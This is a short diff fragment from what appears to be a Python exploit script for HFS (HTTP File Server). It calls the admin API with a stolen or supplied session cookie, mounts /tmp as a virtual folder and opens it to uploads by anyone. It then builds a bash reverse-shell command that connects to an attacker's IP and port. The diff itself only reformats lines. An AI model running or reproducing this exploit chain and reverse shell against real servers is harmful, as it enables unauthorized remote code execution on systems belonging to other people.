@@ -350,8 +350,11 @@ headers = {"x-hfs-anti-csrf":"1","Cookie":cookie}
 
 print("Step 1 add vfs")
 step1 = req.post(url+"~/api/add_vfs", headers=headers, json={"parent":"/","source":"/tmp"})
+
 print("Step 2 set permission vfs")
-step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})
+step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":
+
+{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})
 print("Step 3 create folder")
 
 command = "bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1'".format(ip,port)
